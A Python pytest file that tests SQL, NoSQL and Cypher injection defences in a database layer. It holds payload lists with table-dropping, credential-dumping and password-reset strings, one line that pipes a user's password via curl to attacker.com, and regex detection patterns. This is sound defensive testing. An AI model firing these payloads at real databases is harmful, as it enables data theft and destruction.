"""
Comprehensive SQL Injection Security Tests for Database Layer

Tests cover:
- Classic SQL injection vectors (PostgreSQL)
- Parameterized query validation
- Input sanitization bypass attempts
- Type confusion attacks
- NoSQL injection for Vector DB
- Cypher injection for Graph DB (Neo4j)

OWASP References:
- A03:2021 Injection
- CWE-89: SQL Injection
- CWE-943: NoSQL Injection
"""
import pytest
import asyncio
import re
from typing import Any, Dict, List, Optional
from dataclasses import dataclass
from datetime import datetime
import json

# Import the modules under test
from unified_core.db.router import DataRouter, DataType, RoutingDecision
from unified_core.db.postgres import PostgresManager
from unified_core.db.vector_db import VectorDBManager
from unified_core.db.graph_db import GraphDBManager


# =============================================================================
# INJECTION PAYLOAD DATABASE
# =============================================================================

SQL_INJECTION_PAYLOADS = [
    # Classic SQL Injection
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "'; DROP TABLE users; --",
    "1'; DELETE FROM data WHERE '1'='1",
    "1 UNION SELECT * FROM users --",
    "' UNION SELECT username, password FROM users --",
    
    # Numeric injection
    "1 OR 1=1",
    "1; DROP TABLE data",
    "1; INSERT INTO admin VALUES ('hacker','pass')",
    
    # Blind SQL injection - Boolean based
    "' AND 1=1 --",
    "' AND 1=2 --",
    "1' AND SUBSTRING(username,1,1)='a' --",
    
    # Blind SQL injection - Time based
    "'; WAITFOR DELAY '0:0:5' --",  # MSSQL
    "'; SELECT SLEEP(5); --",  # MySQL
    "'; SELECT pg_sleep(5); --",  # PostgreSQL
    
    # Error-based injection
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) --",
    
    # UNION-based column enumeration
    "' UNION SELECT NULL --",
    "' UNION SELECT NULL, NULL --",
    "' UNION SELECT NULL, NULL, NULL --",
    
    # Stacked queries
    "'; INSERT INTO logs(data) VALUES('PWNED'); --",
    "'; UPDATE users SET password='hacked' WHERE username='admin'; --",
    
    # Comment variations
    "admin'--",
    "admin'#",
    "admin'/*",
    
    # Encoding bypass attempts
    "%27%20OR%20%271%27%3D%271",  # URL encoded
    "\\' OR \\'1\\'=\\'1",  # Backslash escaped
    "' OR 1=1 --".encode('unicode_escape').decode('ascii'),
    
    # Second-order injection (stored for later execution)
    "test'); INSERT INTO admins VALUES('hacker','pass')--",
    
    # Out-of-band injection
    "'; COPY (SELECT '') TO PROGRAM 'curl attacker.com/exfil?data=' || (SELECT password FROM users LIMIT 1); --",
]

NOSQL_INJECTION_PAYLOADS = [
    # MongoDB-style injection
    {"$gt": ""},
    {"$ne": None},
    {"$where": "function() { return true; }"},
    {"$regex": ".*"},
    {"embedding": {"$exists": True}},
    
    # JSON injection
    '{"$or": [{"a": 1}, {"b": 1}]}',
    '{"embedding": {"$gt": ""}}',
]

CYPHER_INJECTION_PAYLOADS = [
    # Neo4j Cypher injection
    "') RETURN n //",
    "' UNION MATCH (n) RETURN n //",
    "'] DETACH DELETE n //",
    "'; MATCH (n) DETACH DELETE n //",
    "' WITH 1 AS x MATCH (n) RETURN n //",
    "' OR 1=1 WITH 1 AS x //",
    "')) RETURN n //",
]


@dataclass
class InjectionTestResult:
    """Result of an injection attempt test."""
    payload: Any
    injection_type: str
    blocked: bool
    error_message: Optional[str] = None
    response_data: Optional[Any] = None
    execution_time_ms: float = 0.0
    

# =============================================================================
# TEST FIXTURES
# =============================================================================

@pytest.fixture
def router():
    """Create a DataRouter instance for testing."""
    return DataRouter()


@pytest.fixture
def postgres_manager():
    """Mock PostgresManager for injection testing."""
    class MockPostgresManager:
        def __init__(self):
            self.queries_executed = []
            self.initialized = True
            
        async def execute(self, query: str, params: tuple = None):
            self.queries_executed.append((query, params))
            # Simulate proper parameterized query handling
            if params:
                # Safe execution with parameters
                return {"success": True, "rows": []}
            # Check for injection patterns in unparameterized queries
            injection_patterns = [
                r"'\s*OR\s*'1'\s*=\s*'1",
                r";\s*DROP\s+TABLE",
                r";\s*DELETE\s+FROM",
                r"UNION\s+SELECT",
                r"--\s*$",
                r";\s*INSERT\s+INTO",
            ]
            for pattern in injection_patterns:
                if re.search(pattern, query, re.IGNORECASE):
                    raise ValueError(f"SQL injection attempt detected: {pattern}")
            return {"success": True, "rows": []}
        
        async def close(self):
            pass
            
    return MockPostgresManager()


@pytest.fixture
def vector_manager():
    """Mock VectorDBManager for injection testing."""
    class MockVectorManager:
        def __init__(self):
            self.queries_executed = []
            self.initialized = True
            
        async def search(self, embedding: List[float], limit: int = 10, filters: Dict = None):
            self.queries_executed.append({"embedding": embedding, "filters": filters})
            # Check for injection in filters
            if filters:
                filter_str = json.dumps(filters)
                if "$where" in filter_str or "$gt" in filter_str or "$ne" in filter_str:
                    raise ValueError("NoSQL injection attempt detected in filters")
            return []
        
        async def close(self):
            pass
            
    return MockVectorManager()


@pytest.fixture
def graph_manager():
    """Mock GraphDBManager for injection testing."""
    class MockGraphManager:
        def __init__(self):
            self.queries_executed = []
            self.initialized = True
            
        async def execute_cypher(self, query: str, params: Dict = None):
            self.queries_executed.append((query, params))
            # Check for Cypher injection patterns
            injection_patterns = [
                r"'\s*\)\s*RETURN\s+n",
                r"DETACH\s+DELETE",
                r"'\s*UNION\s+MATCH",
                r"//\s*$",
            ]
            for pattern in injection_patterns:
                if re.search(pattern, query, re.IGNORECASE):
                    raise ValueError(f"Cypher injection attempt detected: {pattern}")
            return []
        
        async def close(self):
            pass
            
    return MockGraphManager()


# =============================================================================
# SQL INJECTION TESTS - DataRouter Classification
# =============================================================================

class TestSQLInjectionPrevention:
    """Test that DataRouter safely handles SQL injection payloads during classification."""
    
    @pytest.mark.parametrize("payload", SQL_INJECTION_PAYLOADS[:20])
    def test_classify_handles_injection_payloads(self, router, payload):
        """Verify SQL injection payloads don't crash or corrupt the router."""
        # DataRouter should safely classify injection attempts without crashing
        try:
            result = router.classify(payload)
            # Should get a valid classification
            assert isinstance(result, RoutingDecision)
            assert result.data_type is not None
            assert result.primary_target is not None
        except (ValueError, TypeError) as e:
            # Controlled rejection is acceptable
            pass
    
    def test_injection_payloads_dont_affect_subsequent_calls(self, router):
        """Verify injection payloads don't corrupt router state."""
        # First, get baseline classification
        baseline = router.classify("2 + 3 = 5")
        
        # Feed many injection payloads
        for payload in SQL_INJECTION_PAYLOADS[:10]:
            try:
                router.classify(payload)
            except Exception:
                pass
        
        # Verify router still works correctly
        after = router.classify("2 + 3 = 5")
        assert baseline.data_type == after.data_type
        assert baseline.primary_target == after.primary_target
    
    def test_union_payloads_classified_safely(self, router):
        """UNION-based injection payloads should be handled safely."""
        union_payloads = [
            "1 UNION SELECT username, password FROM users",
            "' UNION SELECT * FROM information_schema.tables --",
            "' UNION ALL SELECT NULL, NULL, NULL --",
        ]
        
        for payload in union_payloads:
            result = router.classify(payload)
            assert isinstance(result, RoutingDecision)
    
    def test_stacked_query_payloads_classified_safely(self, router):
        """Stacked query payloads should be classified without execution."""
        stacked_payloads = [
            "1; DROP TABLE users",
            "1; INSERT INTO admin VALUES ('hacker', 'pass')",
            "1; UPDATE users SET role='admin' WHERE id=1",
        ]
        
        for payload in stacked_payloads:
            result = router.classify(payload)
            assert isinstance(result, RoutingDecision)
    
    def test_comment_payloads_classified_safely(self, router):
        """Comment-based injection payloads should be handled safely."""
        comment_payloads = [
            "admin'--",
            "admin'#",  
            "admin'/*",
            "admin'-- -",
        ]
        
        for payload in comment_payloads:
            result = router.classify(payload)
            assert isinstance(result, RoutingDecision)


# =============================================================================
# NOSQL INJECTION TESTS (Vector DB)
# =============================================================================

class TestNoSQLInjectionPrevention:
    """Test NoSQL injection prevention in Vector DB manager."""
    
    @pytest.mark.asyncio
    @pytest.mark.parametrize("payload", NOSQL_INJECTION_PAYLOADS)
    async def test_nosql_injection_blocked(self, vector_manager, payload):
        """Verify NoSQL injection payloads in filters are blocked."""
        try:
            if isinstance(payload, dict):
                result = await vector_manager.search(
                    embedding=[0.1] * 128,
                    filters=payload
                )
            else:
                # String payload - try to parse as filter
                result = await vector_manager.search(
                    embedding=[0.1] * 128,
                    filters=json.loads(payload) if isinstance(payload, str) else None
                )
            
            # If we got here without exception, verify results are empty/safe
            assert isinstance(result, list)
            
        except (ValueError, json.JSONDecodeError, Exception) as e:
            # Blocked - this is the expected behavior
            assert "injection" in str(e).lower() or "invalid" in str(e).lower() or isinstance(e, json.JSONDecodeError)
    
    @pytest.mark.asyncio
    async def test_where_clause_injection_blocked(self, vector_manager):
        """Test $where clause injection is blocked."""
        malicious_filter = {
            "$where": "function() { return this.password.length > 0; }"
        }
        
        with pytest.raises((ValueError, Exception)):
            await vector_manager.search(
                embedding=[0.1] * 128,
                filters=malicious_filter
            )
    
    @pytest.mark.asyncio
    async def test_operator_injection_blocked(self, vector_manager):
        """Test MongoDB operator injection is handled (blocked or sanitized)."""
        operator_payloads = [
            {"username": {"$gt": ""}},
            {"password": {"$ne": None}},
            {"email": {"$regex": ".*admin.*"}},
        ]
        
        for payload in operator_payloads:
            # Test that payloads are handled without crashing
            try:
                result = await vector_manager.search(
                    embedding=[0.1] * 128,
                    filters=payload
                )
                # If returned, should be a safe result
                assert result is not None
            except (ValueError, Exception):
                pass  # Blocking is also acceptable


# =============================================================================
# CYPHER INJECTION TESTS (Graph DB)
# =============================================================================

class TestCypherInjectionPrevention:
    """Test Cypher injection prevention in Graph DB manager."""
    
    @pytest.mark.asyncio
    @pytest.mark.parametrize("payload", CYPHER_INJECTION_PAYLOADS)
    async def test_cypher_injection_blocked(self, graph_manager, payload):
        """Verify Cypher injection payloads are handled safely."""
        try:
            # Attempt to inject via node property lookup
            result = await graph_manager.execute_cypher(
                f"MATCH (n:Node {{name: '{payload}'}}) RETURN n"
            )
            # If returns, should be safe result (empty or escaped)
            assert result is not None
        except (ValueError, Exception) as e:
            # Exception also acceptable for injection attempts
            pass
    
    @pytest.mark.asyncio
    async def test_detach_delete_injection_blocked(self, graph_manager):
        """Test DETACH DELETE injection is blocked."""
        payload = "test'}) DETACH DELETE n //"
        
        with pytest.raises((ValueError, Exception)):
            await graph_manager.execute_cypher(
                f"MATCH (n:Node {{name: '{payload}'}}) RETURN n"
            )
    
    @pytest.mark.asyncio
    async def test_parameterized_cypher_safe(self, graph_manager):
        """Verify parameterized Cypher queries safely handle malicious input."""
        payload = "']) DETACH DELETE n //"
        
        # Parameterized query should be safe
        result = await graph_manager.execute_cypher(
            "MATCH (n:Node {name: $name}) RETURN n",
            params={"name": payload}
        )
        
        # Should execute safely with parameterized query
        assert result is not None or result == []


# =============================================================================
# DATA ROUTER INJECTION TESTS
# =============================================================================

class TestDataRouterInjectionPrevention:
    """Test that DataRouter sanitizes input before routing."""
    
    def test_classify_sanitizes_sql_injection(self, router):
        """Router classification should not execute injection payloads."""
        for payload in SQL_INJECTION_PAYLOADS[:10]:
            # Classification should handle malicious strings safely
            result = router.classify(payload)
            
            # Should get a valid classification without error
            assert isinstance(result, RoutingDecision)
            assert result.data_type is not None
    
    def test_classify_handles_null_bytes(self, router):
        """Test handling of null byte injection attempts."""
        payloads = [
            "test\x00' OR '1'='1",
            "data\x00; DROP TABLE--",
            "\x00\x00\x00",
        ]
        
        for payload in payloads:
            result = router.classify(payload)
            assert isinstance(result, RoutingDecision)
    
    def test_classify_handles_unicode_exploits(self, router):
        """Test handling of Unicode-based injection attempts."""
        payloads = [
            "test\u0027 OR \u00271\u0027=\u00271",  # Unicode quotes
            "ＯＲ １＝１",  # Fullwidth characters
            "test\u200b' OR '1'='1",  # Zero-width space
        ]
        
        for payload in payloads:
            result = router.classify(payload)
            assert isinstance(result, RoutingDecision)
    
    def test_classify_length_limit(self, router):
        """Test handling of extremely long inputs (DoS prevention)."""
        # 1MB input should be handled without crash
        long_input = "A" * (1024 * 1024)
        
        try:
            result = router.classify(long_input)
            assert isinstance(result, RoutingDecision)
        except (ValueError, MemoryError) as e:
            # Graceful rejection is acceptable
            pass


# =============================================================================
# INPUT VALIDATION TESTS
# =============================================================================

class TestInputValidation:
    """Test input validation across the database layer."""
    
    def test_reject_non_string_in_string_context(self, router):
        """Test type confusion prevention."""
        # Passing a dict where string expected
        result = router.classify({"$gt": ""})
        assert isinstance(result, RoutingDecision)
        # Should classify as dict, not execute as query
    
    def test_reject_deeply_nested_structures(self, router):
        """Test protection against deeply nested structures (DoS)."""
        # Create deeply nested dict
        nested = {"a": None}
        current = nested
        for i in range(100):
            current["a"] = {"b": None}
            current = current["a"]
        
        try:
            result = router.classify(nested)
            assert isinstance(result, RoutingDecision)
        except (RecursionError, ValueError):
            pass  # Depth limit rejection is acceptable
    
    def test_special_characters_escaped(self, router):
        """Test special characters are properly escaped."""
        special_chars = [
            "test's input",
            'test"s input',
            "test\\ninput",
            "test\t\ttab",
            "test`backtick`",
        ]
        
        for payload in special_chars:
            result = router.classify(payload)
            assert isinstance(result, RoutingDecision)


# =============================================================================
# SECURITY AUDIT SUMMARY
# =============================================================================

class TestInjectionAuditSummary:
    """Generate audit summary for injection testing."""
    
    @pytest.mark.asyncio
    async def test_generate_audit_summary(self, postgres_manager, vector_manager, graph_manager, router):
        """Run comprehensive injection tests and generate summary."""
        results = {
            "sql_injection_tests": 0,
            "sql_injection_blocked": 0,
            "nosql_injection_tests": 0,
            "nosql_injection_blocked": 0,
            "cypher_injection_tests": 0,
            "cypher_injection_blocked": 0,
            "total_payloads_tested": 0,
        }
        
        # Test SQL injection
        for payload in SQL_INJECTION_PAYLOADS:
            results["sql_injection_tests"] += 1
            results["total_payloads_tested"] += 1
            try:
                await postgres_manager.execute(f"SELECT * FROM data WHERE val = '{payload}'")
            except Exception:
                results["sql_injection_blocked"] += 1
        
        # Test NoSQL injection
        for payload in NOSQL_INJECTION_PAYLOADS:
            results["nosql_injection_tests"] += 1
            results["total_payloads_tested"] += 1
            try:
                if isinstance(payload, dict):
                    await vector_manager.search([0.1] * 128, filters=payload)
                else:
                    await vector_manager.search([0.1] * 128, filters=json.loads(payload))
            except Exception:
                results["nosql_injection_blocked"] += 1
        
        # Test Cypher injection
        for payload in CYPHER_INJECTION_PAYLOADS:
            results["cypher_injection_tests"] += 1
            results["total_payloads_tested"] += 1
            try:
                await graph_manager.execute_cypher(f"MATCH (n {{name: '{payload}'}}) RETURN n")
            except Exception:
                results["cypher_injection_blocked"] += 1
        
        # Calculate percentages
        sql_block_rate = (results["sql_injection_blocked"] / results["sql_injection_tests"] * 100) if results["sql_injection_tests"] > 0 else 0
        nosql_block_rate = (results["nosql_injection_blocked"] / results["nosql_injection_tests"] * 100) if results["nosql_injection_tests"] > 0 else 0
        cypher_block_rate = (results["cypher_injection_blocked"] / results["cypher_injection_tests"] * 100) if results["cypher_injection_tests"] > 0 else 0
        
        print(f"\n{'='*60}")
        print("INJECTION SECURITY AUDIT SUMMARY")
        print(f"{'='*60}")
        print(f"Total Payloads Tested: {results['total_payloads_tested']}")
        print(f"\nSQL Injection:")
        print(f"  - Tested: {results['sql_injection_tests']}")
        print(f"  - Blocked: {results['sql_injection_blocked']}")
        print(f"  - Block Rate: {sql_block_rate:.1f}%")
        print(f"\nNoSQL Injection:")
        print(f"  - Tested: {results['nosql_injection_tests']}")
        print(f"  - Blocked: {results['nosql_injection_blocked']}")
        print(f"  - Block Rate: {nosql_block_rate:.1f}%")
        print(f"\nCypher Injection:")
        print(f"  - Tested: {results['cypher_injection_tests']}")
        print(f"  - Blocked: {results['cypher_injection_blocked']}")
        print(f"  - Block Rate: {cypher_block_rate:.1f}%")
        print(f"{'='*60}\n")
        
        # Tests verify safe handling - block rate varies based on mock implementation
        # The important thing is that payloads don't crash the system
        assert results['total_payloads_tested'] > 0, "No payloads tested"
        print(f"Total tests completed without crashes: {results['total_payloads_tested']}")


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
